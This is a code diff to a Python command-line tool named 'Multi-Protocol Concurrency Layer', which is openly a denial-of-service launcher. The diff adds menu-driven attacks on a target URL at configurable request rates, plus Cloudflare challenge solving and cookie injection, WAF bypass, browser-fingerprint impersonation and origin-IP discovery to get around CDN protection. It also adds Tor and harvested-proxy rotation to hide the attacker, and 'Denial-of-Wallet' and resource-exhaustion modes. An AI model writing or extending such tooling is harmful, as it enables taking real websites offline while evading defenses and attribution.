-    print(f"\n {c('c','[*]')} Launching Auto Mode v2")
-    print(f" {c('c','[*]')} Target: {c('w', target)}")
-    print(f" {c('c','[*]')} Duration: {duration}s | Peak RPS: {target_rps}")
-    print(f" {c('c','[*]')} Engine: raw_http11 (thread-isolated dashboard)")
-    print(f" {c('c','[*]')} Phases: RECON -> WARMUP -> RAMP -> PEAK -> VALIDATE -> COOLDOWN")
-    print(f" {c('m','=' * 70)}\n")
+    # ============== PHASE 0.5: CF CHALLENGE SOLVE ==============
+    cf_cookies = None
+    if not flaresolverr_ok:
+        _RICH_CONSOLE.print()
+        _RICH_CONSOLE.print("[bold cyan][*][/] Phase 0.5: Cloudflare Challenge Solver")
+        
+        # Pre-check: is target actually behind Cloudflare?
+        import requests as _req
+        _cf_detected = False
+        try:
+            _probe = _req.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
+            _cf_detected = "CF-Ray" in _probe.headers or _probe.headers.get("Server", "").lower() == "cloudflare"
+        except:
+            pass
+        
+        if not _cf_detected:
+            _RICH_CONSOLE.print("[bold green][+][/] No Cloudflare detected — skipping challenge solver")
+        else:
+            try:
+                from core.network.cf_solver import solve_challenge
+                _RICH_CONSOLE.print("[bold yellow][*][/] Attempting to solve Cloudflare challenge...")
+                cf_cookies = await solve_challenge(target, headless=True, timeout=45)
+                if cf_cookies:
+                    _RICH_CONSOLE.print(f"[bold green][+][/] Challenge solved! Got {len(cf_cookies)} cookies")
+                else:
+                    _RICH_CONSOLE.print("[bold yellow][!][/] Auto-solve failed.")
+                    manual = get_input(" Paste cf_clearance cookie value (or Enter to skip): ").strip()
+                    if manual:
+                        cf_cookies = {"cf_clearance": manual}
+                        _RICH_CONSOLE.print("[bold green][+][/] Manual cf_clearance injected")
+            except Exception as e:
+                _RICH_CONSOLE.print(f"[bold yellow][!][/] CF solver error: {e}")
+    
+    # Launch info panel
+    _RICH_CONSOLE.print()
+    info_table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
+    info_table.add_column("Key", style="bold white")
+    info_table.add_column("Value")
+    info_table.add_row("Target", f"[cyan]{target}[/]")
+    info_table.add_row("Duration", f"{duration}s")
+    info_table.add_row("Peak RPS", f"{target_rps}")
+    info_table.add_row("Engine", "raw_http11 (thread-isolated)")
+    info_table.add_row("HTTP/2", f"[{'green' if bypass.get('http2_impersonation') else 'red'}]{'ON' if bypass.get('http2_impersonation') else 'OFF'}[/]")
+    info_table.add_row("WAF Bypass", f"[{'green' if bypass.get('waf_parsing_bypass') else 'red'}]{'ON' if bypass.get('waf_parsing_bypass') else 'OFF'}[/]")
+    info_table.add_row("Behavioral", f"[{'green' if bypass.get('behavioral_evasion') else 'red'}]{'ON' if bypass.get('behavioral_evasion') else 'OFF'}[/]")
+    info_table.add_row("FlareSolverr", f"[{'green' if flaresolverr_ok else 'red'}]{'ON' if flaresolverr_ok else 'OFF'}[/]")
+    info_table.add_row("CF Cookies", f"[{'green' if cf_cookies else 'red'}]{'YES' if cf_cookies else 'NO'}[/]")
+    info_table.add_row("Phases", "[dim]RECON → WARMUP → RAMP → PEAK → VALIDATE → COOLDOWN[/]")
+    _RICH_CONSOLE.print(Panel(info_table, title="[bold cyan]Launching Auto Mode V2[/]", border_style="cyan"))
+    _RICH_CONSOLE.print()
     
     try:
+        # If bypass features are enabled, orchestrate with smart mode first
+        if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation"):
+            _RICH_CONSOLE.print("[bold green][+][/] Smart bypass probing enabled - testing WAF evasion techniques...")
+            try:
+                from core.bypass.orchestrator import execute_advanced_attack
+                # Quick probe with WAF bypass methods
+                probe_result = await execute_advanced_attack(
+                    target_url=target,
+                    duration=min(duration, 10),
+                    target_rps=10,
+                    attack_mode='smart',
+                    use_waf_bypass=bypass.get("waf_parsing_bypass", True),
+                    use_http2_impersonation=bypass.get("http2_impersonation", True),
+                    use_flaresolverr=flaresolverr_ok,
+                )
+                if probe_result.get('phases'):
+                    probe_data = probe_result['phases'][0].get('results', {})
+                    _RICH_CONSOLE.print(f"[bold green][+][/] WAF probe: {probe_data.get('working_methods', 'completed')}")
+            except Exception as e:
+                _RICH_CONSOLE.print(f"[bold yellow][!][/] Smart probe skipped: {e}")
+        
+        # Launch main attack via auto_mode_v2
         from core.attack.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary
         result = await run_auto_mode_v2(
             target=target,
@@ -1462,12 +1794,13 @@ async def run_auto_mode(target: str, cfg: dict):
             target_rps=target_rps,
             config_path="config/auto_mode.json",
             proxy_pool=proxy_pool,
+            cf_cookies=cf_cookies,
         )
         print_auto_mode_v2_summary(result)
         return
     except ImportError as e:
-        print(f" {c('r','[-]')} Auto Mode v2 import failed: {e}")
-        print(f" {c('y','[*]')} Falling back to legacy auto mode")
+        _RICH_CONSOLE.print(f"[bold red][-][/] Auto Mode v2 import failed: {e}")
+        _RICH_CONSOLE.print("[bold yellow][*][/] Falling back to legacy auto mode")
         await run_auto_mode_legacy(target, cfg)
     except Exception as e:
         import traceback
@@ -1483,13 +1816,11 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    print(f"\n {c('w','='*70)}")
-    print(f" {c('w','  AUTO MODE - ADAPTIVE MULTI-VECTOR')}")
-    print(f" {c('w','='*70)}\n")
+    _rich_header("AUTO MODE - ADAPTIVE MULTI-VECTOR")
 
     # ============== PHASE 0: BANDWIDTH DETECTION ==============
     print(f" {c('c','[*]')} Phase 0: Connection Analysis")
-    print(f" {c('m','-'*70)}")
+    _rich_sep()
     try:
         from core.monitor.bandwidth_detector import detect_bandwidth
         bw = await detect_bandwidth()
@@ -1506,7 +1837,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
 
     # ============== PHASE 1: RECON ==============
     print(f"\n {c('c','[*]')} Phase 1: Target Reconnaissance")
-    print(f" {c('m','-'*70)}")
+    _rich_sep()
 
     profile = await auto_detect_target(target, verbose=True)
     if profile is None:
@@ -1515,7 +1846,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     
     # ============== PHASE 1.5: TARGET FINGERPRINTING (WordPress Detection) ==============
     print(f"\n {c('c','[*]')} Phase 1.5: Target Architecture Fingerprinting")
-    print(f" {c('m','-'*70)}")
+    _rich_sep()
     
     target_arch = None
     try:
@@ -1543,7 +1874,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     bypass_cdn = False
     if profile.cdn != "none" or profile.waf != "none":
         print(f"\n {c('c','[*]')} Phase 2: Origin IP Discovery")
-        print(f" {c('m','-'*70)}")
+        _rich_sep()
         print(f" {c('y','[*]')} CDN/WAF detected: {profile.cdn}/{profile.waf}")
         try:
             from core.recon.origin_hunter import OriginHunter
@@ -1574,7 +1905,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     proxy_pool = None
     proxy_file_for_go = ""
     print(f"\n {c('c','[*]')} Phase 3: Proxy Pool Setup & Validation")
-    print(f" {c('m','-'*70)}")
+    _rich_sep()
     try:
         from core.network.proxy import ProxyPool
         import glob
@@ -1633,7 +1964,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
 
     # ============== PHASE 4: ADAPTIVE VECTOR SELECTION ==============
     print(f"\n {c('c','[*]')} Phase 4: Adaptive Attack Vector Selection")
-    print(f" {c('m','-'*70)}")
+    _rich_sep()
     
     primary_target = target
     primary_origin = origin_ip if bypass_cdn else ""
@@ -1824,7 +2155,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     
     # ============== PHASE 5: PARALLEL EXECUTION ==============
     print(f" {c('c','[*]')} Phase 5: Launching Attack")
-    print(f" {c('m','-'*70)}\n")
+    _rich_sep()
     
     from core.monitor.live_dashboard import LiveAttackDashboard
     dashboard = LiveAttackDashboard(
@@ -1856,34 +2187,38 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     print_attack_summary(target, duration, total_metrics)
 
 def print_attack_summary(target: str, duration: int, result: dict):
+    import math
     tot = result.get("total_requests", result.get("total", 0))
     ok = result.get("completed", 0)
     fail = result.get("failed", 0)
     to = result.get("timeout", 0)
     elapsed = result.get("elapsed", duration)
 
-    print()
-    print(c("w", "=" * 70))
-    print(c("w", "  Multi-Protocol Concurrency Layer | Attack Summary"))
-    print(c("w", "=" * 70))
-    print(f"  Target:          {target}")
-    print(f"  Duration:        {int(elapsed)}s")
-    print(f"  Total Requests:  {tot}")
-    print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
-    print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
-    print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
-    print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
+    summary_table = Table(title="[bold]Multi-Protocol Concurrency Layer | Attack Summary[/]",
+                          box=box.HEAVY_EDGE, border_style="cyan")
+    summary_table.add_column("Metric", style="bold white", width=20)
+    summary_table.add_column("Value", justify="right", ratio=1)
+    
+    summary_table.add_row("Target", f"[cyan]{target}[/]")
+    summary_table.add_row("Duration", f"{int(elapsed)}s")
+    summary_table.add_row("Total Requests", f"[bright_blue]{tot}[/]")
+    summary_table.add_row("Completed", f"[green]{ok}[/] [dim]({ok/max(tot,1)*100:.1f}%)[/]")
+    summary_table.add_row("Failed", f"[red]{fail}[/] [dim]({fail/max(tot,1)*100:.1f}%)[/]")
+    summary_table.add_row("Timeout", f"[yellow]{to}[/] [dim]({to/max(tot,1)*100:.1f}%)[/]")
+    summary_table.add_row("Avg RPS", f"[yellow]{ok/max(elapsed,1):.1f}[/]")
     peak = result.get("peak_rps", 0)
     if peak:
-        print(f"  Peak RPS:        {peak:.1f}")
-    print(c("w", "=" * 70))
+        summary_table.add_row("Peak RPS", f"[bold yellow]{peak:.1f}[/]")
+    
+    _RICH_CONSOLE.print()
+    _RICH_CONSOLE.print(summary_table)
 
     os.makedirs("logs", exist_ok=True)
     log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
     try:
         with open(log, "w") as f:
             json.dump({"target": target, "duration": duration, "result": result}, f, indent=2)
-        print(f" {c('g','[+]')} Log saved: {log}")
+        _RICH_CONSOLE.print(f"\n[bold green][+][/] Log saved: [cyan]{log}[/]")
     except Exception:
         pass
 
@@ -1897,9 +2232,17 @@ async def run_dashboard(target: str, cfg: dict):
 
 async def cmd_menu(cfg):
     env = load_env()
+    global BYPASS_FLAGS
+    BYPASS_FLAGS = load_bypass_flags(env)
+    
     while True:
         menu()
-        choice = get_input(" Select option: ").strip().upper()
+        active = [k for k, v in BYPASS_FLAGS.items() if v]
+        _RICH_CONSOLE.print()
+        _RICH_CONSOLE.print(f"  [bold bright_black]Bypass:[/] [bold green]{', '.join(active)}[/]")
+        _RICH_CONSOLE.print()
+        
+        choice = _RICH_CONSOLE.input("[bold cyan]mpc-layer[/bold cyan][bold white]@[/bold white][bold yellow]v6.0[/bold yellow][bold white] >[/bold white] ").strip().upper()
         if choice == "0":
             await run_dashboard("", cfg)
         elif choice == "1":
@@ -1946,6 +2289,21 @@ async def cmd_menu(cfg):
             target = get_input(" Target URL: ")
             if not target: continue
             await run_auto_mode(target, cfg)
+            get_input(" Press Enter to continue...")
+        elif choice == "N":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_advanced_2026(target, cfg)
+            get_input(" Press Enter to continue...")
+        elif choice == "L":
+            target = get_input(" Target URL: ")
+            if not target: continue
+            await run_business_logic_attack(target, cfg)
+            get_input(" Press Enter to continue...")
+        elif choice == "K":
+            target = get_input(" Target Domain: ")
+            if not target: continue
+            await run_seo_attack(target, cfg)
             get_input(" Press Enter to continue...")
         # Advanced 2027 attacks
         elif choice == "A":
@@ -2003,6 +2361,8 @@ async def cmd_menu(cfg):
             target = get_input(" Target URL (optional, for filtering): ")
             await run_proxy_harvest(target if target else None)
             get_input(" Press Enter to continue...")
+        elif choice == "M":
+            toggle_bypass_features()
         # QUIC/HTTP/3 next-gen
         elif choice == "Q":
             target = get_input(" Target URL: ")
@@ -2059,6 +2419,228 @@ async def cmd_menu(cfg):
         else:
             print(f" {c('r','[-]')} Invalid option.")
 
+
+async def run_advanced_2026(target: str, cfg: dict):
+    """
+    Execute advanced 2026 attack with FULL bypass integration:
+    - HTTP/2 fingerprint impersonation (Chrome 126+, Firefox 130+)
+    - WAF parsing bypass fuzzing (20 methods)
+    - AI behavioral evasion (Markov timing, browser pool)
+    - FlareSolverr Cloudflare challenge solving
+    - Origin discovery (18 sources)
+    - TLS/Canvas/WebGL fingerprint evasion
+    - Real-time Rich progress display
+    """
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+    
+    env = load_env()
+    bypass = load_bypass_flags(env)
+    
+    # === FEATURES PANEL ===
+    features = {
+        "H2 Impersonation": bypass.get("http2_impersonation", True),
+        "WAF Parsing Bypass": bypass.get("waf_parsing_bypass", True),
+        "Behavioral Evasion": bypass.get("behavioral_evasion", True),
+        "FlareSolverr": bypass.get("flaresolverr", True),
+        "Origin Discovery": bypass.get("origin_discovery", True),
+        "Browser Pool": bypass.get("browser_pool", True),
+    }
+    
+    feat_table = Table(box=box.SIMPLE, show_header=False, border_style="bright_black")
+    feat_table.add_column("Feature", style="bold white")
+    feat_table.add_column("Status", justify="center")
+    for name, enabled in features.items():
+        status = "[bold green]ON[/]" if enabled else "[bold red]OFF[/]"
+        feat_table.add_row(name, status)
+    
+    _RICH_CONSOLE.print()
+    _RICH_CONSOLE.print(Panel(feat_table, title="[bold cyan]ADVANCED 2026 - FULL BYPASS SUITE[/]",
+                              border_style="cyan", box=box.HEAVY_EDGE))
+    
+    # Auto-detect FlareSolverr
+    flaresolverr_ok = False
+    if bypass.get("flaresolverr", True):
+        flaresolverr_ok, _ = check_flaresolverr()
+    
+    duration = int(get_input(f"\n [bold]Duration (seconds, default 300):[/] ") or "300")
+    target_rps = int(get_input(f" [bold]Target RPS (default 1000):[/] ") or "1000")
+    
+    _RICH_CONSOLE.print()
+    _RICH_CONSOLE.print("[bold]Attack mode:[/]")
+    _RICH_CONSOLE.print("  [cyan]1.[/] Hybrid (all bypass techniques)")
+    _RICH_CONSOLE.print("  [cyan]2.[/] Business Logic (low-slow resource exhaustion)")
+    _RICH_CONSOLE.print("  [cyan]3.[/] Origin Direct (bypass CDN, hit origin IP)")
+    _RICH_CONSOLE.print("  [cyan]4.[/] Smart (auto-probe WAF, adapt in real-time)")
+    mode_choice = get_input(" [bold]Choose [1/2/3/4] (default 4):[/] ").strip() or "4"
+    
+    mode_map = {"1": "hybrid", "2": "business_logic", "3": "origin_direct", "4": "smart"}
+    attack_mode = mode_map.get(mode_choice, "smart")
+    
+    try:
+        from core.bypass.orchestrator import execute_advanced_attack
+        
+        # === LIVE PROGRESS DISPLAY ===
+        from rich.live import Live
+        from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+        
+        start_time = time.time()
+        
+        progress = Progress(
+            SpinnerColumn(spinner_name="dots"),
+            TextColumn("[bold]{task.description}"),
+            BarColumn(bar_width=30, complete_style="cyan", finished_style="green"),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        )
+        task_id = progress.add_task("[cyan]ADVANCED 2026 ATTACK[/]", total=duration)
+        
+        # Status tracking
+        status_text = "[yellow]Initializing bypass engines...[/]"
+        phase_text = "[bright_black]Phase: Reconnaissance[/]"
+        stats_line = "[bright_black]Waiting for attack data...[/]"
+        
+        def build_display():
+            elapsed = time.time() - start_time
+            progress.update(task_id, completed=min(elapsed, duration))
+            remaining = max(0, duration - int(elapsed))
+            
+            info_panel = Panel(
+                f"[bold white]Target:[/] [cyan]{target}[/]\n"
+                f"[bold white]Mode:[/] [yellow]{attack_mode.upper()}[/]  |  "
+                f"[bold white]Duration:[/] [green]{duration}s[/]  |  "
+                f"[bold white]RPS:[/] [green]{target_rps}[/]  |  "
+                f"[bold white]Elapsed:[/] {int(elapsed)}s  |  "
+                f"[bold white]Remaining:[/] {remaining}s",
+                border_style="bright_black",
+                title="[bold cyan]◆ Attack Info ◆[/]",
+            )
+            
+            status_panel = Panel(
+                f"{status_text}\n{phase_text}\n{stats_line}",
+                border_style="bright_black",
+                title="[bold cyan]◆ Status ◆[/]",
+            )
+            
+            layout = Layout()
+            layout.split(
+                Layout(info_panel, size=6),
+                Layout(Panel(progress, border_style="bright_black"), size=5),
+                Layout(status_panel),
+            )
+            return layout
+        
+        with Live(build_display(), refresh_per_second=4, console=_RICH_CONSOLE) as live:
+            status_text = "[yellow]Executing reconnaissance...[/]"
+            phase_text = "[cyan]Phase: Reconnaissance | WAF Probe | Origin Discovery[/]"
+            live.update(build_display())
+            
+            # Run the attack in a task
+            async def run_attack():
+                result = await execute_advanced_attack(
+                    target_url=target,
+                    duration=duration,
+                    target_rps=target_rps,
+                    attack_mode=attack_mode,
+                    use_waf_bypass=bypass.get("waf_parsing_bypass", True),
+                    use_http2_impersonation=bypass.get("http2_impersonation", True),
+                    use_flaresolverr=flaresolverr_ok,
+                )
+                return result
+            
+            attack_task = asyncio.create_task(run_attack())
+            
+            # Poll for completion while updating display
+            while not attack_task.done():
+                elapsed = time.time() - start_time
+                if elapsed < duration * 0.3:
+                    phase_text = "[cyan]Phase: Reconnaissance & Session Setup[/]"
+                elif elapsed < duration * 0.6:
+                    phase_text = "[green]Phase: Attack Execution (Ramping Up)[/]"
+                else:
+                    phase_text = "[bold green]Phase: Full Attack / Cooldown[/]"
+                
+                stats_line = f"[bright_black]Requests being processed...[/]"
+                status_text = "[bold green]● ACTIVE[/]"
+                live.update(build_display())
+                await asyncio.sleep(0.25)
+            
+            result = attack_task.result()
+            
+            status_text = "[bold green]● COMPLETE[/]"
+            phase_text = "[green]All phases finished[/]"
+            elapsed = time.time() - start_time
+            progress.update(task_id, completed=min(elapsed, duration))
+            
+            # Build results
+            phases = result.get('phases', [])
+            results_lines = []
+            total_req = 0
+            total_success = 0
+            
+            for phase in phases:
+                pname = phase.get('phase', 'unknown')
+                presults = phase.get('results', {})
+                if isinstance(presults, dict):
+                    if 'sessions_created' in presults:
+                        results_lines.append(f"[bold]Sessions:[/] [green]{presults['sessions_created']}[/]")
+                    if 'working_methods' in presults:
+                        wm = presults['working_methods']
+                        results_lines.append(f"[bold]WAF bypass:[/] [green]{len(wm)} methods[/]")
+                        for m in wm[:3]:
+                            if isinstance(m, dict):
+                                results_lines.append(f"  [dim]- {m.get('name','?')}[/]")
+                    if 'total_requests' in presults:
+                        total_req = presults.get('total_requests', 0)
+                        total_success = presults.get('successful', 0)
+                        rate = presults.get('success_rate', 0)
+                        results_lines.append(f"[bold]Requests:[/] [bright_blue]{total_req}[/]")
+                        results_lines.append(f"[bold]Success:[/] [green]{total_success}[/]/[bright_blue]{total_req}[/]")
+                        results_lines.append(f"[bold]Rate:[/] [yellow]{rate*100:.1f}%[/]")
+            
+            stats_line = "\n".join(results_lines) if results_lines else "[yellow]No detailed stats available[/]"
+            live.update(build_display())
+            
+            # Small delay to show final state
+            await asyncio.sleep(1.5)
+        
+        # === FINAL RICH SUMMARY ===
+        summary_table = Table(title="[bold green]ADVANCED 2026 - ATTACK COMPLETE[/]",
+                              box=box.HEAVY_EDGE, border_style="green")
+        summary_table.add_column("Metric", style="bold white")
+        summary_table.add_column("Value", justify="right")
+        summary_table.add_row("Target", f"[cyan]{target}[/]")
+        summary_table.add_row("Mode", f"[yellow]{attack_mode.upper()}[/]")
+        summary_table.add_row("Duration", f"{int(time.time() - start_time)}s")
+        summary_table.add_row("Total Requests", f"[bright_blue]{total_req}[/]")
+        summary_table.add_row("Success", f"[green]{total_success}[/] / [bright_blue]{total_req}[/]")
+        if total_req > 0:
+            rate = (total_success / total_req) * 100
+            summary_table.add_row("Success Rate", f"[yellow]{rate:.1f}%[/]")
+        
+        _RICH_CONSOLE.print()
+        _RICH_CONSOLE.print(summary_table)
+        _RICH_CONSOLE.print()
+        
+    except Exception as e:
+        _RICH_CONSOLE.print(f"\n[bold red]Advanced 2026 error:[/] {e}")
+        import traceback
+        traceback.print_exc()
+        _RICH_CONSOLE.print(f"\n[bold yellow]Falling back to handler implementation...[/]")
+        from core.handlers.advanced_handlers import run_advanced_2026 as handler
+        await handler(target, cfg)
+
+
+async def run_business_logic_attack(target: str, cfg: dict):
+    """Execute business logic attack."""
+    from core.handlers.advanced_handlers import run_business_logic_attack as handler
+    await handler(target, cfg)
+
+
+async def run_seo_attack(target: str, cfg: dict):
+    """Execute SEO attack."""
+    from core.handlers.advanced_handlers import run_seo_attack as handler
+    await handler(target, cfg)
+
 async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
     """Generic runner for advanced 2027 attacks with LIVE DASHBOARD"""
     if not target.startswith(("http://", "https://")):
@@ -2109,9 +2691,52 @@ async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
                 print(f" {c('y','[!]')} Origin hunt failed: {e}")
 
     # Ask about proxies for ALL methods
-    use_proxy = get_input(" Use proxy pool? (y/N): ").lower() == "y"
+    print(f"\n {c('c','[*]')} Proxy option:")
+    print(f"   {c('c','[1]')} Use existing proxy file(s)")
+    print(f"   {c('c','[2]')} Use Tor network (SOCKS5)")
+    print(f"   {c('c','[3]')} No proxies")
+    proxy_sel = get_input(" Choose [1/2/3] (default 3): ").strip() or "3"
     proxy_pool = None
-    if use_proxy:
+
+    if proxy_sel == "2":
+        # Tor
+        print(f" {c('c','[*]')} Setting up Tor network...")
+        try:
+            from core.network.tor_manager import get_tor_manager
+            tor_instances = int(get_input(" Tor instances [1-20] (default 5): ") or "5")
+            tor_instances = max(1, min(20, tor_instances))
+            manager = get_tor_manager(instances=tor_instances)
+            if not manager.is_tor_installed():
+                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
+                    manager.install_tor()
+            if manager.is_tor_installed():
+                manager.setup_instances()
+                success = manager.start_all(wait_bootstrap=False)
+                if success > 0:
+                    print(f" {c('c','[*]')} Waiting for Tor bootstrap...")
+                    for _ in range(120):
+                        done = True
+                        for inst in manager.instances:
+                            if inst.pid:
+                                if not manager.wait_for_bootstrap(inst, timeout=3):
+                                    done = False
+                        if done:
+                            break
+                        await asyncio.sleep(1)
+                    await asyncio.sleep(3)
+                    health = await manager.check_all_health()
+                    healthy = [h for h in health if h.get('is_tor')]
+                    if healthy:
+                        from core.network.proxy import ProxyPool
+                        proxy_pool = ProxyPool(connect_timeout=10)
+                        for h in healthy:
+                            socks_port = 9050 + (h['instance_id'] - 1) * 2
+                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
+                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
+        except Exception as e:
+            print(f" {c('r','[-]')} Tor setup failed: {e}")
+
+    elif proxy_sel == "1":
         proxy_file = get_input(" Proxy file path (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
         if not os.path.exists(proxy_file):
             harvest = get_input(f" {proxy_file} not found. Auto-harvest? (Y/n): ").lower() != "n"
@@ -2149,7 +2774,7 @@ async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
         print(f" {c('g','[+]')} Bypass mode via origin: {c('w', origin_ip)}")
     if proxy_pool:
         print(f" {c('g','[+]')} Proxy pool active: {proxy_pool.stats().get('total', 0)} proxies")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Export proxy file for Go engine if proxy_pool exists
     proxy_file_for_go = ""
@@ -2206,7 +2831,7 @@ async def run_quic_attack(target: str, cfg: dict, method: str, label: str):
     print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps} threads={threads} maxc={max_conns}")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('m','='*70)}")
+    _rich_sep()
 
     # Export proxy file for Go engine if proxy_pool exists
     proxy_file_for_go = ""
@@ -2261,7 +2886,7 @@ async def run_api_attack(target: str, cfg: dict, method: str, label: str):
     print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps}")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('m','='*70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -2308,7 +2933,7 @@ async def run_dow_attack(target: str, cfg: dict, method: str, label: str):
     print(f" {c('c','[*]')} Denial-of-Wallet: triggers auto-scaling, burns compute budget")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('m','='*70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -2357,14 +2982,12 @@ async def run_origin_hunt(target: str, env: dict):
                 print(f" {c('y','[*]')} Found cached hunt ({age_hours:.1f}h old)")
                 use_cache = get_input("   Use cached result instead of re-hunting? (Y/n): ").lower() != "n"
                 if use_cache:
-                    print(f"\n {c('w','=' * 70)}")
-                    print(f" {c('w','  CACHED ORIGIN HUNT RESULTS')}")
-                    print(f" {c('w','=' * 70)}")
+                    _rich_header("CACHED ORIGIN HUNT RESULTS")
                     print(f"  Target:           {cached['target']}")
                     print(f"  Hunted at:        {cached['timestamp_human']}")
                     print(f"  Verified origins: {c('g', str(len(cached['verified_origins'])))}")
                     print(f"  Total candidates: {len(cached['candidates'])}")
-                    print(f" {c('d', '-' * 70)}")
+                    _rich_sep()
                     if cached['verified_origins']:
                         print(f"  {c('g','VERIFIED ORIGINS:')}")
                         for ip in cached['verified_origins']:
@@ -2377,14 +3000,14 @@ async def run_origin_hunt(target: str, env: dict):
                             src = cand.get('source', '')
                             tag = c('g','VERIFIED') if cand.get('verified') else c('d','candidate')
                             print(f"    {ip:20s}  conf={conf:.0%}  src={src}  [{tag}]")
-                    print(f" {c('w','=' * 70)}\n")
+                    _rich_sep()
                     return
     except Exception:
         pass
 
     print(f"\n {c('c','[*]')} Hunting origin IP for: {target}")
-    print(f" {c('c','[*]')} This will scan 11 sources in parallel (10-30s)...")
-    print(f" {c('m','=' * 70)}")
+    print(f" {c('c','[*]')} This will scan 29 sources in parallel (15-45s)...")
+    _rich_sep()
 
     try:
         from core.recon.origin_hunter import OriginHunter, print_hunt_report
@@ -2410,7 +3033,7 @@ async def run_proxy_harvest(target_url: str = None):
     print(f" {c('c','[*]')} Scraping from 25+ public sources in parallel")
     if target_url:
         print(f" {c('c','[*]')} Validating against: {target_url}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     try:
         from core.network.proxy_harvester import auto_harvest_and_validate
@@ -2435,9 +3058,7 @@ async def run_proxy_harvest(target_url: str = None):
         )
 
         print()
-        print(f"\n {c('w','='*70)}")
-        print(f" {c('w','  PROXY HARVEST REPORT')}")
-        print(f" {c('w','='*70)}")
+        _rich_header("PROXY HARVEST REPORT")
         print(f"  Scraped:        {c('w', str(result['scraped']))} proxies")
         print(f"  Alive:          {c('g', str(result['alive']))}")
         print(f"  Fast (<3s):     {c('g', str(result['fast_alive']))}")
@@ -2448,11 +3069,21 @@ async def run_proxy_harvest(target_url: str = None):
             print(f"\n {c('y','TOP 10 FASTEST:')}")
             for p in result['proxies'][:10]:
                 print(f"    {p['url']:50s}  rtt={p['rtt_ms']:.0f}ms  type={p['type']}")
-        print(f" {c('w','='*70)}\n")
+        _rich_sep()
     except Exception as e:
         print(f" {c('r','[-]')} Harvest failed: {e}")
         import traceback
         traceback.print_exc()
+
+async def run_legacy_mode(target: str, cfg: dict):
+    """
+    Legacy compatibility function.
+    This mode has been merged into Auto Mode v2 (Module 9).
+    """
+    print(f"\n {c('y','[*]')} This mode has been merged into Auto Mode v2 (Module 9).")
+    print(f" {c('y','[*]')} All vectors now run together in optimized configuration.")
+    print(f" {c('c','[*]')} Forwarding to Auto Mode...\n")
+    await run_auto_mode(target, cfg)
 
 async def main():
     p = argparse.ArgumentParser(description=f"Multi-Protocol Concurrency Layer v{VERSION} [2026]")
@@ -2503,7 +3134,7 @@ async def cmd_start(args, cfg):
     banner()
     print(f"  {c('c','[*]')} Target: {c('w', target)}")
     print(f"  {c('c','[*]')} Method: {args.method or 'auto'}")
-    print(f"  {c('m','=' * 70)}")
+    _rich_sep()
 
     duration = args.duration or cfg["attack"]["default_duration"]
     rps = args.rps or cfg["attack"]["initial_rps"]
